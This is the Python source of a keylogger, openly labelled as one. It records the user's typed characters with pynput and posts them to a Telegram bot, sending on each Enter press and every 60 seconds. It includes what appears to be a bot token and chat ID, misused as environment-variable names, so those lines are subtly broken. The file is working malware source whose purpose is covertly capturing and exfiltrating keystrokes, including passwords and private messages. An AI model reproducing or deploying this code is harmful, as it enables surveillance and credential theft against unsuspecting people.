from pynput import keyboard
import requests
import threading
import time
import os

# === CONFIGURATION ===
BOT_TOKEN = os.environ.get('8346087012:AAGUFItHu3hRLJ4loxduUcteyJOoOzRrMkE')
CHAT_ID = os.environ.get('7192294390')
# =====================

keystroke_buffer = ""
SEND_INTERVAL = 60

def send_to_telegram(message):
    """Sends cleaned message to Telegram"""
    if not message.strip():
        return
        
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": f"📝 Keystrokes:\n{message}"}
    
    try:
        response = requests.post(url, data=data, timeout=10)
        if response.status_code == 200:
            print("[+] Logs sent to Telegram")
    except Exception as e:
        print(f"[-] Send error: {e}")

def on_press(key):
    """Handles key presses with clean output"""
    global keystroke_buffer
    
    try:
        # Handle character keys
        if hasattr(key, 'char') and key.char is not None:
            keystroke_buffer += key.char
            
        # Handle special keys - ONLY process Enter for new lines
        elif key == keyboard.Key.enter:
            keystroke_buffer += "\n"
            # Send immediately when Enter is pressed
            if keystroke_buffer.strip():
                send_to_telegram(keystroke_buffer)
                keystroke_buffer = ""
                
        elif key == keyboard.Key.space:
            keystroke_buffer += " "
            
        # IGNORE all other special keys (backspace, shift, ctrl, etc.)
        # This creates clean, raw typing output
        
    except AttributeError:
        # Ignore any unexpected key attributes
        pass

def periodic_send():
    """Sends buffer periodically"""
    global keystroke_buffer
    if keystroke_buffer.strip():
        send_to_telegram(keystroke_buffer)
        keystroke_buffer = ""
    
    threading.Timer(SEND_INTERVAL, periodic_send).start()

# Start the keylogger
if __name__ == "__main__":
    print("[*] Starting clean keylogger...")
    print("[*] Special keys (backspace, arrows, etc.) are filtered out")
    print("[*] Only characters, spaces, and Enter are recorded")
    
    periodic_send()
    
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("\n[!] Keylogger stopped")
